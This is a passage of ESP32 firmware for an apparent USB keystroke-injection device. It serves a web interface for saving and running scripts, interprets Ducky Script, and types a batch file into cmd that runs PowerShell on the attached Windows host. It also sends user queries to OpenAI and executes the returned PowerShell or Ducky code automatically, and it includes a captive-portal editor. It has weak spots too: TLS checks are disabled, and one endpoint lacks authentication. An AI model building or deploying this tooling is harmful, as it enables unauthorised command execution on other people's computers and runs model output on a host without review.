    } else if (upload.status == UPLOAD_FILE_WRITE) {
        if (uploadFile) uploadFile.write(upload.buf, upload.currentSize);
    } else if (upload.status == UPLOAD_FILE_END) {
        if (uploadFile) uploadFile.close();
    }
}

void handleFormatSD() {
    if (!checkAuth()) return;
    logRequest(server);
    
    if (!server.hasArg("confirm") || server.arg("confirm") != "yes") {
        server.send(400, "text/plain", "Add ?confirm=yes to proceed");
        return;
    }
    
    File root = SD.open("/");
    while (File entry = root.openNextFile()) {
        String name = String(entry.name());
        entry.close();
        if (name != "/settings.json") SD.remove(name);
    }
    root.close();
    server.send(200, "text/plain", "Formatted (settings preserved)");
}

// ============================================================================
// Script Handlers
// ============================================================================
void handleSaveScript() {
    if (!checkAuth()) return;
    logRequest(server);
    
    String path;
    if (server.hasArg("path")) {
        path = server.arg("path");
    } else if (server.hasArg("name")) {
        path = "/scripts/" + server.arg("name") + ".txt";
    } else {
        server.send(400, "text/plain", "Missing path/name");
        return;
    }
    
    if (!isValidPath(path)) {
        server.send(400, "text/plain", "Invalid path");
        return;
    }
    
    if (server.hasArg("content")) {
        File file = SD.open(path, FILE_WRITE);
        if (file) {
            file.print(server.arg("content"));
            file.close();
            server.send(200, "text/plain", "Saved");
        } else {
            server.send(500, "text/plain", "Save failed");
        }
    } else {
        server.send(400, "text/plain", "Missing content");
    }
}

void handleDeleteScript() {
    if (!checkAuth()) return;
    logRequest(server);
    
    if (server.hasArg("name")) {
        if (SD.remove("/scripts/" + server.arg("name") + ".txt")) {
            server.send(200, "text/plain", "Deleted");
        } else {
            server.send(500, "text/plain", "Delete failed");
        }
    } else {
        server.send(400, "text/plain", "Bad Request");
    }
}

void handleListScripts() {
    if (!checkAuth()) return;
    logRequest(server);
    server.send(200, "application/json", getScriptList());
}

/*String getScriptList() {
    File root = SD.open("/scripts");
    if (!root) return "[]";
    
    String list = "[";
    File entry = root.openNextFile();
    while (entry) {
        if (!entry.isDirectory() && String(entry.name()).endsWith(".txt")) {
            if (list != "[") list += ",";
            String name = String(entry.name());
            name.replace(".txt", "");
            list += "\"" + name + "\"";
        }
        entry.close();
        entry = root.openNextFile();
    }
    list += "]";
    root.close();
    return list;
}*/


String getScriptList() {
    File root = SD.open("/scripts");
    if (!root) return "[]";

    String scriptList = "[";
    int count = 0;
    int maxFiles = 50;  // Limit to 50 files
    
    File entry = root.openNextFile();
    while (entry && count < maxFiles) {
        if (!entry.isDirectory() && String(entry.name()).endsWith(".txt")) {
            if (scriptList != "[") scriptList += ",";
            String fname = String(entry.name());
            fname.replace(".txt", "");
            scriptList += "\"" + fname + "\"";
            count++;
        }
        entry.close();
        entry = root.openNextFile();
    }
    scriptList += "]";
    root.close();
    
    if (count >= maxFiles) {
        Serial.println("Warning: Script list truncated at " + String(maxFiles) + " files");
    }
    
    return scriptList;
}



void handleExecuteScript() {
    if (!checkAuth()) return;
    logRequest(server);
    
    if (server.hasArg("script")) {
        executeScriptViaCmd(server.arg("script"));
        server.send(200, "text/plain", "Execution started");
    } else {
        server.send(400, "text/plain", "Bad Request");
    }
}

// ============================================================================
// AI Integration
// ============================================================================
String createJsonPayload(const String& userContent, const String& systemPrompt) {
    JsonDocument doc;
    doc["model"] = settings.model;
    JsonArray messages = doc["messages"].to<JsonArray>();
    
    JsonObject sysMsg = messages.add<JsonObject>();
    sysMsg["role"] = "system";
    sysMsg["content"] = systemPrompt;
    
    JsonObject userMsg = messages.add<JsonObject>();
    userMsg["role"] = "user";
    userMsg["content"] = userContent;
    
    doc["max_tokens"] = settings.max_completion_tokens;
    doc["temperature"] = settings.temperature;
    
    String output;
    serializeJson(doc, output);
    return output;
}

String sendToOpenAI(const String& query, const String& systemPrompt) {
    if (settings.openai_api_key.length() == 0) {
        return "Error: No API key configured. Set it in Settings.";
    }
    
    WiFiClientSecure client;
    client.setInsecure();
    client.setTimeout(20000);
    
    HTTPClient http;
    http.begin(client, "https://api.openai.com/v1/chat/completions");
    http.addHeader("Content-Type", "application/json");
    http.addHeader("Authorization", "Bearer " + settings.openai_api_key);
    http.setTimeout(20000);
    
    int code = http.POST(createJsonPayload(query, systemPrompt));
    String response = http.getString();
    http.end();
    
    return (code > 0) ? extractContentField(response) : "API Error: " + String(code);
}

String extractContentField(const String& response) {
    JsonDocument doc;
    if (deserializeJson(doc, response)) return "Parse error";
    const char* content = doc["choices"][0]["message"]["content"];
    return content ? String(content) : "No content";
}

void handleSubmit() {
    if (!checkAuth()) return;
    logRequest(server);
    
    if (!server.hasArg("query")) {
        server.send(400, "text/plain", "No query");
        return;
    }
    
    String systemPrompt = 
        "You are an expert script generator. Respond ONLY with these XML tags:\n"
        "1. <explanation>Brief description</explanation>\n"
        "2. <script_type>powershell or ducky</script_type>\n"
        "3. <script_name>filename.ext</script_name>\n"
        "4. <script_code>The script code</script_code>";
    
    String response = sendToOpenAI(server.arg("query"), systemPrompt);
    server.send(200, "text/plain", parseAndExecuteAiResponse(response));
}

String extractTagContent(const String& source, const String& tag) {
    String start = "<" + tag + ">";
    String end = "</" + tag + ">";
    int s = source.indexOf(start);
    if (s == -1) return "";
    s += start.length();
    int e = source.indexOf(end, s);
    return (e == -1) ? "" : source.substring(s, e);
}

String parseAndExecuteAiResponse(const String& response) {
    String explanation = extractTagContent(response, "explanation");
    String type = extractTagContent(response, "script_type");
    String code = extractTagContent(response, "script_code");
    
    if (type.length() == 0 || code.length() == 0) {
        return explanation.length() > 0 ? explanation : response;
    }
    
    code.trim();
    
    if (type == "powershell") {
        executeScriptViaCmd(code);
    } else if (type == "ducky") {
        executeDuckyScript(code);
    } else {
        return "Unknown script type: " + type;
    }
    
    return "Executing: " + explanation;
}

// ============================================================================
// Keyboard Functions
// ============================================================================
/*void sendKeyboardText(const String& text) {
    for (size_t i = 0; i < text.length(); i++) {
        Keyboard.write(text.charAt(i));
        delay(settings.typing_delay);
    }
}*/

/*void sendKeyboardText(const String& text) {
    const int BASE_DELAY_US = 3000;  // Increase to 3ms (was 1.8ms)
    const int PROBLEM_CHAR_EXTRA_MS = 50;  // Increase to 50ms
    const int BATCH_SIZE = 5;  // Smaller batches (was 10)
    
    for (size_t i = 0; i < text.length(); i++) {
        char c = text.charAt(i);
        
        // Press and release with minimal hold
        Keyboard.press(c);
        delayMicroseconds(1000);  // Increase hold time to 1ms (was 600us)
        Keyboard.release(c);
        
        // Check for problematic characters that need extra time
        if (c == '-' || c == '\\' || c == '"' || c == '\'' || c == '|' || c == '<' || c == '>' || c == ',' || c == '.') {
            delay(PROBLEM_CHAR_EXTRA_MS);
        } else {
            delayMicroseconds(BASE_DELAY_US + (settings.typing_delay * 10));
        }
        
        // Periodic buffer sync - more frequent
        if ((i + 1) % BATCH_SIZE == 0) {
            delay(5);  // Increase sync delay to 5ms
        }
    }
}*/


void sendKeyboardText(const String& text) {
    const int CHAR_DELAY_MS = 10;  
    const int HOLD_TIME_US = 35;   
    
    for (size_t i = 0; i < text.length(); i++) {
        char c = text.charAt(i);
        
        Keyboard.press(c);
        delayMicroseconds(HOLD_TIME_US);
        Keyboard.release(c);
 
        delay(CHAR_DELAY_MS);
        
        // Extra pause every 5 characters to let buffer clear
        if ((i + 1) % 5 == 0) {
            delay(CHAR_DELAY_MS);
        }
    }
}


void testTypingSpeed() {
    Keyboard.begin();
    delay(1000);
    
    // Open Run dialog
    Keyboard.press(KEY_LEFT_GUI);
    Keyboard.press('r');
    delay(200);
    Keyboard.releaseAll();
    delay(500);
    
    // Open Notepad
    Keyboard.print("C:\\Windows\\System32\\notepad.exe");
    delay(200);
    Keyboard.press(KEY_RETURN);
    Keyboard.releaseAll();
    delay(3000);
    
    String testString = "The quick brown fox jumps over the lazy dog, '0, 1, 2, 3, 4, 5, 6, 7, 8, 9'\n";
    
    for (int i = 0; i < 3; i++) {
        sendKeyboardText(testString);
        delay(200);  // Full second between lines
    }
    
    Keyboard.end();
}



// Add this handler to your web server handlers section
void handleTestTyping() {
    logRequest(server);
    testTypingSpeed();
    server.send(200, "text/plain", "Typing test initiated - check Notepad!");
}













String convertPowerShellToSingleCommand(const String& script) {
    String result = "\"";
    String line = "";
    
    for (int i = 0; i < script.length(); i++) {
        char c = script.charAt(i);
        if (c == '\n' || c == '\r') {
            line.trim();
            if (line.length() > 0 && !line.startsWith("#")) {
                if (result.length() > 1) result += "; ";
                result += line;
            }
            line = "";
        } else {
            line += c;
        }
    }
    
    line.trim();
    if (line.length() > 0 && !line.startsWith("#")) {
        if (result.length() > 1) result += "; ";
        result += line;
    }
    
    return result + "\"";
}

void executeScriptViaCmd(const String& content) {
    Keyboard.begin();
    delay(500);
    
    // Win+R
    Keyboard.press(KEY_LEFT_GUI);
    Keyboard.press('r');
    delay(200);
    Keyboard.releaseAll();
    delay(500);
    
    // Open CMD
    Keyboard.print("cmd");
    delay(200);
    Keyboard.press(KEY_RETURN);
    Keyboard.releaseAll();
    delay(750);
    
    // Create batch file
    String fileName = "exec_" + String(millis()) + ".bat";
    String path = "%USERPROFILE%\\Desktop\\" + fileName;
    
    sendKeyboardText("echo @echo off > " + path);
    Keyboard.press(KEY_RETURN);
    Keyboard.releaseAll();
    delay(300);
    
    String cmd = "echo powershell -Command " + convertPowerShellToSingleCommand(content) + " >> " + path;
    sendKeyboardText(cmd);
    Keyboard.press(KEY_RETURN);
    Keyboard.releaseAll();
    delay(300);
    
    sendKeyboardText("exit");
    Keyboard.press(KEY_RETURN);
    Keyboard.releaseAll();
    delay(500);
    
    // Execute
    Keyboard.press(KEY_LEFT_GUI);
    Keyboard.press('r');
    delay(200);
    Keyboard.releaseAll();
    delay(500);
    
    sendKeyboardText(path);
    Keyboard.press(KEY_RETURN);
    Keyboard.releaseAll();
    
    Keyboard.end();
}

void handleConvertPowerShell() {
    if (!checkAuth()) return;
    if (server.hasArg("script")) {
        server.send(200, "text/plain", convertPowerShellToSingleCommand(server.arg("script")));
    } else {
        server.send(400, "text/plain", "No script");
    }
}

// ============================================================================
// Ducky Script Execution
// ============================================================================
void executeDuckyScript(const String& script) {
    Keyboard.begin();
    delay(500);
    
    int idx = 0;
    int defaultDelay = 0;
    
    while (idx < script.length()) {
        int next = script.indexOf('\n', idx);
        if (next == -1) next = script.length();
        
        String line = script.substring(idx, next);
        line.trim();
        idx = next + 1;
        
        if (line.length() == 0) continue;
        if (defaultDelay > 0) delay(defaultDelay);
        
        if (line.startsWith("REM")) continue;
        else if (line.startsWith("DEFAULT_DELAY ")) defaultDelay = line.substring(14).toInt();
        else if (line.startsWith("DEFAULTDELAY ")) defaultDelay = line.substring(13).toInt();
        else if (line.startsWith("STRING ")) sendKeyboardText(line.substring(7));
        else if (line.startsWith("DELAY ")) delay(line.substring(6).toInt());
        else if (line == "ENTER") { Keyboard.press(KEY_RETURN); delay(50); Keyboard.releaseAll(); }
        else if (line == "TAB") { Keyboard.press(KEY_TAB); delay(50); Keyboard.releaseAll(); }
        else if (line == "ESCAPE" || line == "ESC") { Keyboard.press(KEY_ESC); delay(50); Keyboard.releaseAll(); }
        else if (line == "BACKSPACE") { Keyboard.press(KEY_BACKSPACE); delay(50); Keyboard.releaseAll(); }
        else if (line == "DELETE" || line == "DEL") { Keyboard.press(KEY_DELETE); delay(50); Keyboard.releaseAll(); }
        else if (line == "SPACE") { Keyboard.press(' '); delay(50); Keyboard.releaseAll(); }
        else if (line == "UP" || line == "UPARROW") { Keyboard.press(KEY_UP_ARROW); delay(50); Keyboard.releaseAll(); }
        else if (line == "DOWN" || line == "DOWNARROW") { Keyboard.press(KEY_DOWN_ARROW); delay(50); Keyboard.releaseAll(); }
        else if (line == "LEFT" || line == "LEFTARROW") { Keyboard.press(KEY_LEFT_ARROW); delay(50); Keyboard.releaseAll(); }
        else if (line == "RIGHT" || line == "RIGHTARROW") { Keyboard.press(KEY_RIGHT_ARROW); delay(50); Keyboard.releaseAll(); }
        else if (line == "CAPSLOCK") { Keyboard.press(KEY_CAPS_LOCK); delay(50); Keyboard.releaseAll(); }
        else if (line == "F1") { Keyboard.press(KEY_F1); delay(50); Keyboard.releaseAll(); }
        else if (line == "F2") { Keyboard.press(KEY_F2); delay(50); Keyboard.releaseAll(); }
        else if (line == "F3") { Keyboard.press(KEY_F3); delay(50); Keyboard.releaseAll(); }
        else if (line == "F4") { Keyboard.press(KEY_F4); delay(50); Keyboard.releaseAll(); }
        else if (line == "F5") { Keyboard.press(KEY_F5); delay(50); Keyboard.releaseAll(); }
        else if (line == "F6") { Keyboard.press(KEY_F6); delay(50); Keyboard.releaseAll(); }
        else if (line == "F7") { Keyboard.press(KEY_F7); delay(50); Keyboard.releaseAll(); }
        else if (line == "F8") { Keyboard.press(KEY_F8); delay(50); Keyboard.releaseAll(); }
        else if (line == "F9") { Keyboard.press(KEY_F9); delay(50); Keyboard.releaseAll(); }
        else if (line == "F10") { Keyboard.press(KEY_F10); delay(50); Keyboard.releaseAll(); }
        else if (line == "F11") { Keyboard.press(KEY_F11); delay(50); Keyboard.releaseAll(); }
        else if (line == "F12") { Keyboard.press(KEY_F12); delay(50); Keyboard.releaseAll(); }
        else if (line == "GUI" || line == "WINDOWS") { Keyboard.press(KEY_LEFT_GUI); delay(50); Keyboard.releaseAll(); }
        else if (line.startsWith("GUI ") || line.startsWith("WINDOWS ")) {
            Keyboard.press(KEY_LEFT_GUI);
            Keyboard.press(line.charAt(line.indexOf(' ') + 1));
            delay(50);
            Keyboard.releaseAll();
        }
        else if (line.startsWith("CTRL ")) {
            Keyboard.press(KEY_LEFT_CTRL);
            Keyboard.press(line.charAt(line.indexOf(' ') + 1));
            delay(50);
            Keyboard.releaseAll();
        }
        else if (line.startsWith("ALT ")) {
            Keyboard.press(KEY_LEFT_ALT);
            Keyboard.press(line.charAt(line.indexOf(' ') + 1));
            delay(50);
            Keyboard.releaseAll();
        }
        else if (line.startsWith("SHIFT ")) {
            Keyboard.press(KEY_LEFT_SHIFT);
            Keyboard.press(line.charAt(line.indexOf(' ') + 1));
            delay(50);
            Keyboard.releaseAll();
        }
        else if (line.startsWith("CTRL-ALT ")) {
            Keyboard.press(KEY_LEFT_CTRL);
            Keyboard.press(KEY_LEFT_ALT);
            Keyboard.press(line.charAt(line.indexOf(' ') + 1));
            delay(50);
            Keyboard.releaseAll();
        }
        else if (line.startsWith("CTRL-SHIFT ")) {
            Keyboard.press(KEY_LEFT_CTRL);
            Keyboard.press(KEY_LEFT_SHIFT);
            Keyboard.press(line.charAt(line.indexOf(' ') + 1));
            delay(50);
            Keyboard.releaseAll();
        }
    }
    
    Keyboard.end();
}

void handleExecuteDucky() {
    if (!checkAuth()) return;
    logRequest(server);
    
    if (server.hasArg("plain")) {
        executeDuckyScript(server.arg("plain"));
        server.send(200, "text/plain", "Ducky script executed");
    } else {
        server.send(400, "text/plain", "No script content");
    }
}

void displayOnLCD(const String& message) {
    Paint_Clear(BLACK);
    Paint_DrawString_EN(0, 0, message.c_str(), &Font20, BLACK, BLUE);
}

// ============================================================================
// System Configuration Management
// ============================================================================
void loadSystemConfig() {
    File file = SD.open("/config/system.json");
    if (!file) {
        Serial.println("No system.json - using defaults");
        saveSystemConfig();
        return;
    }

    JsonDocument doc;
    if (deserializeJson(doc, file)) {
        Serial.println("Failed to parse system.json");
        file.close();
        return;
    }

    sysConfig.rndisEnabled = doc["rndisEnabled"] | sysConfig.rndisEnabled;
    sysConfig.adblockEnabled = doc["adblockEnabled"] | sysConfig.adblockEnabled;
    sysConfig.dnsServerEnabled = doc["dnsServerEnabled"] | sysConfig.dnsServerEnabled;
    sysConfig.activePortal = doc["activePortal"] | sysConfig.activePortal;
    sysConfig.dnsUpstream = doc["dnsUpstream"] | sysConfig.dnsUpstream;

    // Browser settings
    sysConfig.browserTimeout = doc["browserTimeout"] | sysConfig.browserTimeout;
    sysConfig.browserMaxSize = doc["browserMaxSize"] | sysConfig.browserMaxSize;
    sysConfig.browserStripImages = doc["browserStripImages"] | sysConfig.browserStripImages;
    sysConfig.browserStripForms = doc["browserStripForms"] | sysConfig.browserStripForms;
    if (doc.containsKey("browserUserAgent")) {
        sysConfig.browserUserAgent = doc["browserUserAgent"].as<String>();
    }

    file.close();
    Serial.println("System config loaded");
}

void saveSystemConfig() {
    File file = SD.open("/config/system.json", FILE_WRITE);
    if (!file) {
        Serial.println("Failed to open system.json for writing");
        return;
    }

    JsonDocument doc;
    doc["rndisEnabled"] = sysConfig.rndisEnabled;
    doc["adblockEnabled"] = sysConfig.adblockEnabled;
    doc["dnsServerEnabled"] = sysConfig.dnsServerEnabled;
    doc["activePortal"] = sysConfig.activePortal;
    doc["dnsUpstream"] = sysConfig.dnsUpstream;

    // Browser settings
    doc["browserTimeout"] = sysConfig.browserTimeout;
    doc["browserMaxSize"] = sysConfig.browserMaxSize;
    doc["browserStripImages"] = sysConfig.browserStripImages;
    doc["browserStripForms"] = sysConfig.browserStripForms;
    doc["browserUserAgent"] = sysConfig.browserUserAgent;

    serializeJson(doc, file);
    file.close();
    Serial.println("System config saved");
}

// ============================================================================
// Bloom Filter for DNS Blocklist
// ============================================================================
uint32_t hash1(const String& str) {
    uint32_t hash = 5381;
    for (int i = 0; i < str.length(); i++) {
        hash = ((hash << 5) + hash) + str.charAt(i);
    }
    return hash;
}

uint32_t hash2(const String& str) {
    uint32_t hash = 0;
    for (int i = 0; i < str.length(); i++) {
        hash = str.charAt(i) + (hash << 6) + (hash << 16) - hash;
    }
    return hash;
}

uint32_t hash3(const String& str) {
    uint32_t hash = 0x811c9dc5;
    for (int i = 0; i < str.length(); i++) {
        hash ^= str.charAt(i);
        hash *= 0x01000193;
    }
    return hash;
}

void addToBloomFilter(const String& domain) {
    String lower = domain;
    lower.toLowerCase();

    uint32_t h1 = hash1(lower) % (BLOOM_SIZE * 8);
    uint32_t h2 = hash2(lower) % (BLOOM_SIZE * 8);
    uint32_t h3 = hash3(lower) % (BLOOM_SIZE * 8);

    bloomFilter[h1 / 8] |= (1 << (h1 % 8));
    bloomFilter[h2 / 8] |= (1 << (h2 % 8));
    bloomFilter[h3 / 8] |= (1 << (h3 % 8));
}

bool checkBloomFilter(const String& domain) {
    if (!bloomFilterLoaded) return false;

    String lower = domain;
    lower.toLowerCase();

    uint32_t h1 = hash1(lower) % (BLOOM_SIZE * 8);
    uint32_t h2 = hash2(lower) % (BLOOM_SIZE * 8);
    uint32_t h3 = hash3(lower) % (BLOOM_SIZE * 8);

    return (bloomFilter[h1 / 8] & (1 << (h1 % 8))) &&
           (bloomFilter[h2 / 8] & (1 << (h2 % 8))) &&
           (bloomFilter[h3 / 8] & (1 << (h3 % 8)));
}

void initBloomFilter() {
    memset(bloomFilter, 0, BLOOM_SIZE);

    File dir = SD.open("/blocklists");
    if (!dir) {
        Serial.println("No blocklists directory");
        return;
    }

    int domainCount = 0;
    File entry = dir.openNextFile();
    while (entry) {
        if (!entry.isDirectory() && String(entry.name()).endsWith(".txt")) {
            Serial.print("Loading blocklist: ");
            Serial.println(entry.name());

            while (entry.available()) {
                String line = entry.readStringUntil('\n');
                line.trim();

                // Skip comments and empty lines
                if (line.length() == 0 || line.startsWith("#")) continue;

                // Handle hosts file format (0.0.0.0 domain or 127.0.0.1 domain)
                int spaceIdx = line.indexOf(' ');
                if (spaceIdx > 0) {
                    line = line.substring(spaceIdx + 1);
                    line.trim();
                }

                // Handle tab-separated format
                int tabIdx = line.indexOf('\t');
                if (tabIdx > 0) {
                    line = line.substring(tabIdx + 1);
                    line.trim();
                }

                if (line.length() > 0 && line.indexOf('.') > 0) {
                    addToBloomFilter(line);
                    domainCount++;
                }
            }
        }
        entry.close();
        entry = dir.openNextFile();
    }
    dir.close();

    bloomFilterLoaded = (domainCount > 0);
    Serial.print("Bloom filter loaded with ");
    Serial.print(domainCount);
    Serial.println(" domains");
}

// ============================================================================
// Portal IDE Page Handler
// ============================================================================
void handlePortalIDE() {
    if (!checkAuth()) return;
    logRequest(server);

    String html = R"WEBUI(
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Portal IDE - ESP32</title>
    <link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>🌐</text></svg>">
    <style>
        :root{--bg:#1a1a2e;--card:#16213e;--secondary:#0f3460;--accent:#e94560;--success:#00bf63;--danger:#ff6b6b;--text:#eaeaea;--dim:#a0a0a0;--border:#0f3460}
        *{box-sizing:border-box;margin:0;padding:0}
        html,body{height:100%;margin:0;padding:0;overflow:hidden}
        body{font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,sans-serif;background:var(--bg);color:var(--text)}
        .page-wrapper{display:flex;flex-direction:column;height:100vh;padding:15px}
        header{flex-shrink:0;background:linear-gradient(135deg,var(--card),var(--secondary));padding:1rem;margin-bottom:15px;border-radius:12px;display:flex;align-items:center;gap:15px}
        header a{color:var(--text);text-decoration:none;font-size:1.5rem;transition:transform .2s}
        header a:hover{transform:scale(1.1)}
        header h1{font-size:1.3rem}
        .content-container{display:flex;gap:15px;flex-grow:1;min-height:0}
        .sidebar{flex:0 0 250px;background:var(--card);padding:15px;border-radius:12px;overflow-y:auto;display:flex;flex-direction:column}
        .sidebar h3{color:var(--accent);margin-bottom:15px;font-size:1rem;border-bottom:2px solid var(--accent);padding-bottom:10px}
        .file-list{flex-grow:1;overflow-y:auto}
        .file-item{display:flex;align-items:center;justify-content:space-between;padding:10px;margin-bottom:5px;background:var(--bg);border-radius:8px;cursor:pointer;transition:all .2s}
        .file-item:hover{background:var(--secondary)}
        .file-item.active{border-left:3px solid var(--success);background:var(--secondary)}
        .file-item.selected{border:2px solid var(--accent)}
        .file-name{flex:1;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
        .file-active-badge{background:var(--success);color:#fff;padding:2px 6px;border-radius:4px;font-size:0.7rem;margin-left:5px}
        .main-content{flex-grow:1;display:flex;flex-direction:column;min-width:0}
        .toolbar{display:flex;gap:10px;margin-bottom:10px;flex-wrap:wrap}
        .toolbar input{flex:1;min-width:150px;padding:10px;border-radius:8px;border:1px solid var(--border);background:var(--bg);color:var(--text)}
        .toolbar button{padding:10px 15px;border-radius:8px;border:none;cursor:pointer;font-weight:600;background:var(--secondary);color:var(--text);transition:all .2s}
        .toolbar button:hover{background:var(--accent)}
        .toolbar button.success{background:var(--success)}
        .toolbar button.danger{background:var(--danger)}
        .editor-container{flex-grow:1;display:flex;gap:15px;min-height:0}
        #codeEditor{flex:1;width:100%;padding:15px;border-radius:8px;border:1px solid var(--border);background:var(--bg);color:var(--text);font-family:'Fira Code','Courier New',monospace;font-size:14px;resize:none;line-height:1.5}
        .preview-panel{flex:0 0 40%;background:var(--card);border-radius:12px;overflow:hidden;display:flex;flex-direction:column}
        .preview-header{padding:10px 15px;background:var(--secondary);font-weight:600;display:flex;justify-content:space-between;align-items:center}
        #previewFrame{flex:1;border:none;background:#fff}
        .toast{position:fixed;bottom:20px;right:20px;padding:15px 25px;border-radius:8px;color:#fff;font-weight:600;z-index:9999;animation:slideIn .3s;box-shadow:0 4px 12px rgba(0,0,0,.3)}
        .toast.success{background:var(--success)}
        .toast.error{background:var(--danger)}
        .toast.info{background:var(--secondary)}
        @keyframes slideIn{from{transform:translateX(100%);opacity:0}to{transform:translateX(0);opacity:1}}
        @media(max-width:900px){.content-container{flex-direction:column}.sidebar{flex:0 0 auto;max-height:150px}.editor-container{flex-direction:column}.preview-panel{flex:0 0 300px}}
    </style>
</head>
<body>
    <div class="page-wrapper">
        <header>
            <a href="/">← Back</a>
            <h1>🌐 Portal IDE - Captive Portal Editor</h1>
        </header>

        <div class="content-container">
            <div class="sidebar">
                <h3>Portal Files</h3>
                <div class="file-list" id="fileList"></div>
                <div style="margin-top:15px">
                    <input type="text" id="newFileName" placeholder="new_portal.html" style="width:100%;padding:10px;margin-bottom:8px;border-radius:8px;border:1px solid var(--border);background:var(--bg);color:var(--text)">
                    <button onclick="createFile()" style="width:100%;padding:10px;border-radius:8px;border:none;background:var(--success);color:#fff;cursor:pointer;font-weight:600">+ Create New</button>
                </div>
            </div>

            <div class="main-content">
                <div class="toolbar">
                    <input type="text" id="currentFile" placeholder="Select a file..." readonly>
                    <button class="success" onclick="saveFile()">💾 Save</button>
                    <button onclick="setActive()">⭐ Set Active</button>
                    <button class="danger" onclick="deleteFile()">🗑️ Delete</button>
                    <button onclick="refreshPreview()">🔄 Preview</button>
                </div>

                <div class="editor-container">
                    <textarea id="codeEditor" placeholder="Select a file to edit or create a new one..."></textarea>
                    <div class="preview-panel">
                        <div class="preview-header">
                            <span>Live Preview</span>
                            <span id="previewStatus">Ready</span>
                        </div>
                        <iframe id="previewFrame" sandbox="allow-same-origin"></iframe>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <script>
        let currentFileName = '';
        let activePortal = '';

        function showToast(message, type = 'success') {
            const toast = document.createElement('div');
            toast.className = 'toast ' + type;
            toast.textContent = message;
            document.body.appendChild(toast);
            setTimeout(() => { toast.style.opacity = '0'; setTimeout(() => toast.remove(), 300); }, 3000);
        }

        function loadFileList() {
            fetch('/api/portals/list')
                .then(r => r.json())
                .then(data => {
                    activePortal = data.activePortal || '';
                    const list = document.getElementById('fileList');
                    list.innerHTML = '';
                    data.files.forEach(file => {
                        const div = document.createElement('div');
                        div.className = 'file-item' + (file === currentFileName ? ' selected' : '') + (('/portals/' + file) === activePortal ? ' active' : '');
                        div.innerHTML = '<span class="file-name">' + file + '</span>' + (('/portals/' + file) === activePortal ? '<span class="file-active-badge">ACTIVE</span>' : '');
                        div.onclick = () => loadFile(file);
                        list.appendChild(div);
                    });
                })
                .catch(e => showToast('Failed to load file list', 'error'));
        }

        function loadFile(filename) {
            fetch('/api/portals/load?file=' + encodeURIComponent(filename))
                .then(r => r.ok ? r.text() : Promise.reject('File not found'))
                .then(content => {
                    currentFileName = filename;
                    document.getElementById('currentFile').value = filename;
                    document.getElementById('codeEditor').value = content;
                    loadFileList();
                    refreshPreview();
                })
                .catch(e => showToast('Error loading file: ' + e, 'error'));
        }

        function saveFile() {
            if (!currentFileName) {
                showToast('No file selected', 'error');
                return;
            }
            const content = document.getElementById('codeEditor').value;
            fetch('/api/portals/save', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({filename: currentFileName, content: content})
            })
            .then(r => r.ok ? showToast('File saved!') : showToast('Save failed', 'error'))
            .catch(e => showToast('Error: ' + e, 'error'));
        }

        function createFile() {
            let filename = document.getElementById('newFileName').value.trim();
            if (!filename) {
                showToast('Enter a filename', 'error');
                return;
            }
            if (!filename.endsWith('.html')) filename += '.html';

            fetch('/api/portals/save', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({filename: filename, content: '<!DOCTYPE html>\n<html>\n<head>\n    <title>New Portal</title>\n</head>\n<body>\n    <h1>Hello World</h1>\n</body>\n</html>'})
            })
            .then(r => {
                if (r.ok) {
                    showToast('File created!');
                    document.getElementById('newFileName').value = '';
                    loadFileList();
                    loadFile(filename);
                } else {
                    showToast('Create failed', 'error');
                }
            })
            .catch(e => showToast('Error: ' + e, 'error'));
        }

        function deleteFile() {
            if (!currentFileName) {
                showToast('No file selected', 'error');
                return;
            }
            if (!confirm('Delete "' + currentFileName + '"?')) return;

            fetch('/api/portals/delete', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({filename: currentFileName})
            })
            .then(r => {
                if (r.ok) {
                    showToast('File deleted');
                    currentFileName = '';
                    document.getElementById('currentFile').value = '';
                    document.getElementById('codeEditor').value = '';
                    loadFileList();
                } else {
                    showToast('Delete failed', 'error');
                }
            })
            .catch(e => showToast('Error: ' + e, 'error'));
        }

        function setActive() {
            if (!currentFileName) {
                showToast('No file selected', 'error');
                return;
            }
            fetch('/api/portals/set_active', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({filename: currentFileName})
            })
            .then(r => {
                if (r.ok) {
                    showToast('Portal set as active!');
                    loadFileList();
                } else {
                    showToast('Failed to set active', 'error');
                }
            })
            .catch(e => showToast('Error: ' + e, 'error'));
        }

        function refreshPreview() {
            const code = document.getElementById('codeEditor').value;
            const iframe = document.getElementById('previewFrame');
            iframe.srcdoc = code;
            document.getElementById('previewStatus').textContent = 'Updated';
            setTimeout(() => document.getElementById('previewStatus').textContent = 'Ready', 1000);
        }

        document.getElementById('codeEditor').addEventListener('input', function() {
            clearTimeout(this.previewTimeout);
            this.previewTimeout = setTimeout(refreshPreview, 500);
        });

        window.onload = loadFileList;
    </script>
</body>
</html>
)WEBUI";
    server.send(200, "text/html", html);
}

// ============================================================================
// Portal IDE API Handlers
// ============================================================================
void handleApiPortalsList() {
    if (!checkAuth()) return;
    logRequest(server);

    File dir = SD.open("/portals");
    if (!dir) {
        server.send(500, "application/json", "{\"error\":\"Cannot open portals directory\"}");
        return;
    }

    String json = "{\"activePortal\":\"" + sysConfig.activePortal + "\",\"files\":[";
    bool first = true;
    File entry = dir.openNextFile();
    while (entry) {
        if (!entry.isDirectory()) {
            String name = String(entry.name());
            name = name.substring(name.lastIndexOf('/') + 1);
            if (!first) json += ",";
            json += "\"" + name + "\"";
            first = false;
        }
        entry.close();
        entry = dir.openNextFile();
    }
    json += "]}";
    dir.close();

    server.send(200, "application/json", json);
}

void handleApiPortalsLoad() {
    if (!checkAuth()) return;
    logRequest(server);

    if (!server.hasArg("file")) {
        server.send(400, "text/plain", "Missing file parameter");
        return;
    }

    String filename = server.arg("file");
    if (filename.indexOf("..") != -1 || filename.indexOf("/") != -1) {
        server.send(403, "text/plain", "Invalid filename");
        return;
    }

    String path = "/portals/" + filename;
    File file = SD.open(path);
    if (!file) {
